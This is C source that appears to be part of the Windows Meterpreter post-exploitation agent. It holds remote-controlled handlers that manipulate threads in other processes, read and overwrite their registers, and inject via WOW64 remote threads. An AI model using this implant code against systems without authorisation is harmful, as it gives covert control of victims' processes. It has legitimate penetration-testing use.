#include "precomp.h"
#include "common_metapi.h"

ULONG get_thread_register_value(LPCONTEXT context, LPCSTR name, DWORD size);
VOID set_thread_register_value(LPCONTEXT, LPCSTR name, ULONG value);

typedef BOOL (WINAPI *PISWOW64PROCESS)(HANDLE, PBOOL);
static PISWOW64PROCESS pIsWow64Process = NULL;

BOOL LocalIsWow64Process(HANDLE hProcess)
{
	BOOL result = FALSE;

	if (!pIsWow64Process)
	{
		pIsWow64Process = (PISWOW64PROCESS)GetProcAddress(GetModuleHandleA("kernel32.dll"), "IsWow64Process");
	}

	if (pIsWow64Process)
	{
		if (!pIsWow64Process(hProcess, &result))
		{
			result = FALSE;
		}
	}

	return result;
}

/*
 * Opens a thread with the supplied identifier using the supplied permissions
 * and returns a HANDLE to the requestor
 *
 * req: TLV_TYPE_THREAD_ID    - The thread identifier to open
 * req: TLV_TYPE_THREAD_PERMS - Thre thread permissions to open with
 */
DWORD request_sys_process_thread_open(Remote *remote, Packet *packet)
{
	Packet *response = met_api->packet.create_response(packet);
	HANDLE handle = NULL;
	DWORD result = ERROR_SUCCESS;
	DWORD threadId;
	DWORD perms;

	// Get the parameters
	threadId = met_api->packet.get_tlv_value_uint(packet, TLV_TYPE_THREAD_ID);
	perms    = met_api->packet.get_tlv_value_uint(packet, TLV_TYPE_THREAD_PERMS);

	do
	{
		// Validate parameters
		if (!threadId)
		{
			result = ERROR_INVALID_PARAMETER;
			break;
		}

		// Open the thread
		if (!(handle = OpenThread(perms, FALSE, threadId)))
		{
			result = GetLastError();
			break;
		}

		// Add the handle to the response packet
		met_api->packet.add_tlv_qword(response, TLV_TYPE_THREAD_HANDLE, (QWORD)handle);

	} while (0);

	met_api->packet.transmit_response(result, remote, response);

	return ERROR_SUCCESS;
}

/*
 * Creates a thread in the context of the supplied process and returns the
 * handle that was allocated to represent it to the requestor.
 *
 * req: TLV_TYPE_HANDLE          - The process handle within which to allocate the
 *                                 thread.
 * req: TLV_TYPE_ENTRY_POINT     - The entry point of the thread.
 * opt: TLV_TYPE_ENTRY_PARAMETER - The parameter that is passed to the thread
 *                                 entry
 * req: TLV_TYPE_CREATION_FLAGS  - Flags used for creation of the thread
 */
DWORD request_sys_process_thread_create(Remote *remote, Packet *packet)
{
	Packet *response = met_api->packet.create_response(packet);
	HANDLE hProcess, hThread = NULL;
	LPVOID lpEntryPoint;
	LPVOID lpEntryParam;
	DWORD dwResult = ERROR_SUCCESS;
	DWORD dwCreateFlags;
	DWORD dwThreadId;

	// Snag the parameters
	hProcess     = (HANDLE)met_api->packet.get_tlv_value_qword(packet, TLV_TYPE_PROCESS_HANDLE);
	lpEntryPoint  = (LPVOID)met_api->packet.get_tlv_value_qword(packet, TLV_TYPE_ENTRY_POINT);
	lpEntryParam  = (LPVOID)met_api->packet.get_tlv_value_qword(packet, TLV_TYPE_ENTRY_PARAMETER);
	dwCreateFlags = met_api->packet.get_tlv_value_uint(packet, TLV_TYPE_CREATION_FLAGS);

	do
	{
		// No process handle or entry point?
		if (!hProcess || !lpEntryPoint)
		{
			dwResult = ERROR_INVALID_PARAMETER;
			break;
		}

		dprintf("[THREAD CREATE] CreateFlags: %x", dwCreateFlags);

		// Create the thread in the process supplied
		if (!(hThread = met_api->thread.create_remote(hProcess, 0, lpEntryPoint, lpEntryParam, dwCreateFlags, &dwThreadId)))
		{
			dprintf("[THREAD CREATE] Failed to create remote thread");
			dwResult = GetLastError();

			if ((dwResult == ERROR_ACCESS_DENIED || dwResult == ERROR_INVALID_HANDLE)
				&& dwMeterpreterArch == PROCESS_ARCH_X86
				&& LocalIsWow64Process(GetCurrentProcess())
				&& !LocalIsWow64Process(hProcess))
			{
				dprintf("[THREAD CREATE] Target is x64, attempting wow64 injection");

				// looking good, let's see if we can do the wow64 injection.
				dwResult = met_api->inject.via_remotethread_wow64(hProcess, lpEntryPoint, lpEntryParam, &hThread);
				if (dwResult != ERROR_SUCCESS)
				{
					dprintf("[THREAD CREATE] Wow64 injection failed: %u (%x)", dwResult, dwResult);
					break;
				}

				// the wow64 thread creation creates the thread in a suspended state, so unless there
				// is the suspended flag set, we need to resume it
				if ((dwCreateFlags & CREATE_SUSPENDED) == 0)
				{
					ResumeThread(hThread);
				}
			}
			else
			{
				dprintf("[THREAD CREATE] Thread creation failed: %u (%x)", dwResult, dwResult);
				break;
			}
		}

		dprintf("[THREAD CREATE] Thread creation succeeded");
		// Set the thread identifier and handle on the response
		met_api->packet.add_tlv_uint(response, TLV_TYPE_THREAD_ID, dwThreadId);
		met_api->packet.add_tlv_qword(response, TLV_TYPE_THREAD_HANDLE, (QWORD)hThread);

	} while (0);

	met_api->packet.transmit_response(dwResult, remote, response);

	return ERROR_SUCCESS;
}

/*
 * Close a previously opened thread handle
 *
 * req: TLV_TYPE_THREAD_HANDLE - The thread handle to close
 */
DWORD request_sys_process_thread_close(Remote *remote, Packet *packet)
{
	Packet *response = met_api->packet.create_response(packet);
	HANDLE thread;
	DWORD result = ERROR_SUCCESS;

	if ((thread = (HANDLE)met_api->packet.get_tlv_value_qword(packet, TLV_TYPE_THREAD_HANDLE)))
		CloseHandle(thread);
	else
		result = ERROR_INVALID_PARAMETER;

	met_api->packet.transmit_response(result, remote, response);

	return ERROR_SUCCESS;
}

/*
 * Returns a list of thread identifiers that are running in the context of the
 * supplied process.
 *
 * req: TLV_TYPE_PID - The process identifier to operate on
 */
DWORD request_sys_process_thread_get_threads(Remote *remote, Packet *packet)
{
	Packet *response = met_api->packet.create_response(packet);
	THREADENTRY32 entry;
	HANDLE th32 = NULL;
	DWORD result = ERROR_SUCCESS;
	DWORD processId;

	processId = met_api->packet.get_tlv_value_uint(packet, TLV_TYPE_PID);

	do
	{
		// Validate the process identifier
		if (!processId)
		{
			result = ERROR_INVALID_PARAMETER;
			break;
		}

		// Get a snapshot of the threads running in the supplied process
		if (!(th32 = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, processId)))
		{
			result = GetLastError();
			break;
		}

		entry.dwSize = sizeof(entry);
		
		// If the first enumeration fails, see why
		if (Thread32First(th32, &entry))
		{
			// Keep looping until there are no more threads
			do
			{
				if (entry.th32OwnerProcessID != processId)
					continue;

				met_api->packet.add_tlv_uint(response, TLV_TYPE_THREAD_ID, entry.th32ThreadID);

			} while (Thread32Next(th32, &entry));
		}

		// If we did not reach the end of the enumeration cleanly, something
		// stupid happened
		if (GetLastError() != ERROR_NO_MORE_FILES)
		{
			result = GetLastError();
			break;
		}

	} while (0);

	met_api->packet.transmit_response(result, remote, response);

	// Cleanup
	if (th32)
		CloseHandle(th32);

	return ERROR_SUCCESS;
}

/*
 * Suspends the supplied thread handle
 *
 * req: TLV_TYPE_THREAD_HANDLE - The thread to suspend.
 */
DWORD request_sys_process_thread_suspend(Remote *remote, Packet *packet)
{
	Packet *response = met_api->packet.create_response(packet);
	HANDLE thread;
	DWORD result = ERROR_SUCCESS;

	if ((thread = (HANDLE)met_api->packet.get_tlv_value_qword(packet, TLV_TYPE_THREAD_HANDLE)))
	{
		if (SuspendThread(thread) == (DWORD)-1)
			result = GetLastError();
	}
	else
		result = ERROR_INVALID_PARAMETER;

	met_api->packet.transmit_response(result, remote, response);

	return ERROR_SUCCESS;
}

/*
 * Resumes the supplied thread handle
 *
 * req: TLV_TYPE_THREAD_HANDLE - The thread to resume.
 */
DWORD request_sys_process_thread_resume(Remote *remote, Packet *packet)
{
	Packet *response = met_api->packet.create_response(packet);
	HANDLE thread;
	DWORD result = ERROR_SUCCESS;

	if ((thread = (HANDLE)met_api->packet.get_tlv_value_qword(packet, TLV_TYPE_THREAD_HANDLE)))
	{
		if (ResumeThread(thread) == (DWORD)-1)
			result = GetLastError();
	}
	else
		result = ERROR_INVALID_PARAMETER;

	met_api->packet.transmit_response(result, remote, response);

	return ERROR_SUCCESS;
}

/*
 * Terminate the supplied thread with the supplied exit code
 *
 * req: TLV_TYPE_THREAD_HANDLE - The thread to terminate.
 * req: TLV_TYPE_EXIT_CODE - The exit code to use when terminating.
 */
DWORD request_sys_process_thread_terminate(Remote *remote, Packet *packet)
{
	Packet *response = met_api->packet.create_response(packet);
	HANDLE thread;
	DWORD result = ERROR_SUCCESS;
	DWORD code;

	if ((thread = (HANDLE)met_api->packet.get_tlv_value_qword(packet, TLV_TYPE_THREAD_HANDLE)))
	{
		code = met_api->packet.get_tlv_value_uint(packet, TLV_TYPE_EXIT_CODE);

		if (!TerminateThread(thread, code))
			result = GetLastError();
	}
	else
		result = ERROR_INVALID_PARAMETER;

	met_api->packet.transmit_response(result, remote, response);

	return ERROR_SUCCESS;
}

/*
 * Query the register state of the supplied thread
 *
 * req: TLV_TYPE_THREAD_HANDLE - The thread to query
 */
DWORD request_sys_process_thread_query_regs(Remote *remote, Packet *packet)
{
	Packet *response = met_api->packet.create_response(packet);
	HANDLE thread;
	DWORD result = ERROR_SUCCESS;

	do
	{
		if ((thread = (HANDLE)met_api->packet.get_tlv_value_qword(packet, TLV_TYPE_THREAD_HANDLE)))
		{
			CONTEXT context;
			DWORD index;
			struct
			{
				LPCSTR    name;
				DWORD     size;
			} regs[] = 
			{
				{ "eax",    4 },
				{ "ebx",    4 },
				{ "ecx",    4 },
				{ "edx",    4 },
				{ "esi",    4 },
				{ "edi",    4 },
				{ "ebp",    4 },
				{ "esp",    4 },
				{ "eip",    4 },
				{ "ss",     2 },
				{ "cs",     2 },
				{ "ds",     2 },
				{ "es",     2 },
				{ "fs",     2 },
				{ "gs",     2 },
				{ "eflags", 4 },
				{ NULL,     0 },
			};
			Tlv reg[3];

			memset(&context, 0, sizeof(context));

			// Get all standard registers
			context.ContextFlags = CONTEXT_FULL;

			// Get the thread's context
			if (!GetThreadContext(thread, &context))
			{
				result = GetLastError();
				break;
			}

			// Get the values associated with each register
			for (index = 0;
			     regs[index].name;
			     index++)
			{
				DWORD sizeNbo, valNbo, value;

				// Get the value 
				value = get_thread_register_value(&context, 
						regs[index].name, regs[index].size);

				// Convert the integer values to network byte order
				sizeNbo = htonl(regs[index].size);
				valNbo  = htonl(value);

				// Translate each register into a grouped TLV
				reg[0].header.length = (DWORD)strlen(regs[index].name) + 1;
				reg[0].header.type   = TLV_TYPE_REGISTER_NAME;
				reg[0].buffer        = (PUCHAR)regs[index].name;
				reg[1].header.length = sizeof(DWORD);
				reg[1].header.type   = TLV_TYPE_REGISTER_SIZE;
				reg[1].buffer        = (PUCHAR)&sizeNbo;
				reg[2].header.length = sizeof(DWORD);
				reg[2].header.type   = TLV_TYPE_REGISTER_VALUE_32;
				reg[2].buffer        = (PUCHAR)&valNbo;

				// Add the register
				met_api->packet.add_tlv_group(response, TLV_TYPE_REGISTER, reg, 3);
			}
		}
		else
			result = ERROR_INVALID_PARAMETER;

	} while (0);

	met_api->packet.transmit_response(result, remote, response);

	return ERROR_SUCCESS;
}

/*
 * Set the register state of the supplied thread
 *
 * req: TLV_TYPE_THREAD_HANDLE - The thread to set
 * req: TLV_TYPE_REGISTER x N  - The registers to set
 */
DWORD request_sys_process_thread_set_regs(Remote *remote, Packet *packet)
{
	Packet *response = met_api->packet.create_response(packet);
	HANDLE thread;
	DWORD result = ERROR_SUCCESS;

	do
	{
		if ((thread = (HANDLE)met_api->packet.get_tlv_value_qword(packet, TLV_TYPE_THREAD_HANDLE)))
		{
			CONTEXT context;
			DWORD index = 0;
			Tlv reg;

			memset(&context, 0, sizeof(context));

			// Get the current thread register state
			context.ContextFlags = CONTEXT_FULL;

			if (!GetThreadContext(thread, &context))
			{
				result = GetLastError();
				break;
			}

			// Enumerate through all of the register we're setting
			while (met_api->packet.enum_tlv(packet, index++, TLV_TYPE_REGISTER, 
					&reg) == ERROR_SUCCESS)
			{
				LPCSTR name;
				ULONG value;
				Tlv nameTlv, valueTlv;

				// Get the group's entries
				if ((met_api->packet.get_tlv_group_entry(packet, &reg, 
						TLV_TYPE_REGISTER_NAME, &nameTlv) != ERROR_SUCCESS) ||
				    (met_api->packet.get_tlv_group_entry(packet, &reg,
						TLV_TYPE_REGISTER_VALUE_32, &valueTlv) != ERROR_SUCCESS))
					continue;
				
				// Validate them
				if ((met_api->packet.is_tlv_null_terminated(&nameTlv) != ERROR_SUCCESS)
					|| (valueTlv.header.length < sizeof(ULONG)))
					continue;
				
				// Stash them
				name  = (LPCSTR)nameTlv.buffer;
				value = ntohl(*(PULONG)valueTlv.buffer);

				// Set this register's value
				set_thread_register_value(&context, name, value);
			}

			// Update the thread's context
			if (!SetThreadContext(thread, &context))
			{
				result = GetLastError();
				break;
			}
		}
		else
			result = ERROR_INVALID_PARAMETER;

	} while (0);

	met_api->packet.transmit_response(result, remote, response);

	return ERROR_SUCCESS;
}

/*********************
 * Internal Routines *
 *********************/

/*
 * Returns a pointer to a four byte wide register within the context structure
 * that is associated with the supplied register name
 */
// sf: we have to rewrite this for x64
#ifdef _WIN64
PULONG get_thread_register_4(LPCONTEXT context, LPCSTR name)
{
	if (!strcasecmp(name, "rax"))
		return (PULONG)&context->Rax;
	else if (!strcasecmp(name, "rbx"))
		return (PULONG)&context->Rbx;
	else if (!strcasecmp(name, "rcx"))
		return (PULONG)&context->Rcx;
	else if (!strcasecmp(name, "rdx"))
		return (PULONG)&context->Rdx;
	else if (!strcasecmp(name, "rsi"))
		return (PULONG)&context->Rsi;
	else if (!strcasecmp(name, "rdi"))
		return (PULONG)&context->Rdi;
	else if (!strcasecmp(name, "rbp"))
		return (PULONG)&context->Rbp;
	else if (!strcasecmp(name, "rsp"))
		return (PULONG)&context->Rsp;
	else if (!strcasecmp(name, "rip"))
		return (PULONG)&context->Rip;
	else if (!strcasecmp(name, "Eflags"))
		return (PULONG)&context->EFlags;

	return NULL;
}
#else
PULONG get_thread_register_4(LPCONTEXT context, LPCSTR name)
{
	if (!strcasecmp(name, "eax"))
		return &context->Eax;
	else if (!strcasecmp(name, "ebx"))
		return &context->Ebx;
	else if (!strcasecmp(name, "ecx"))
		return &context->Ecx;
	else if (!strcasecmp(name, "edx"))
		return &context->Edx;
	else if (!strcasecmp(name, "esi"))
		return &context->Esi;
	else if (!strcasecmp(name, "edi"))
		return &context->Edi;
	else if (!strcasecmp(name, "ebp"))
		return &context->Ebp;
	else if (!strcasecmp(name, "esp"))
		return &context->Esp;
	else if (!strcasecmp(name, "eip"))
		return &context->Eip;
	else if (!strcasecmp(name, "eflags"))
		return &context->EFlags;

	return NULL;
}
#endif
/*
 * Returns a pointer to a two byte wide register within the context structure
 * that is associated with the supplied register name
 */
PULONG get_thread_register_2(LPCONTEXT context, LPCSTR name)
{
	if (!strcasecmp(name, "ss"))
		return (PULONG)&context->SegSs;
	else if (!strcasecmp(name, "cs"))
		return (PULONG)&context->SegCs;
	else if (!strcasecmp(name, "ds"))
		return (PULONG)&context->SegDs;
	else if (!strcasecmp(name, "es"))
		return (PULONG)&context->SegEs;
	else if (!strcasecmp(name, "fs"))
		return (PULONG)&context->SegFs;
	else if (!strcasecmp(name, "gs"))
		return (PULONG)&context->SegGs;

	return NULL;
}

/*
 * Returns the value of the supplied register within the context
 */
ULONG get_thread_register_value(LPCONTEXT context, LPCSTR name,
	DWORD size)
{
	ULONG value = 0;

	switch (size)
	{
		case 4:
			{
				PULONG val = get_thread_register_4(context, name);

				if (val)
					value = *val;
			}
			break;
		case 2:
			{
				PULONG val = get_thread_register_2(context, name);

				if (val)
					value = *val & 0xffff;
			}
			break;
		default:
			break;
	}

	return value;
}

/*
 * Sets the value of the supplied register
 */
VOID set_thread_register_value(LPCONTEXT context, LPCSTR name,
	ULONG value)
{
	PULONG val = get_thread_register_4(context, name);

	if (val)
		*val = value;
}
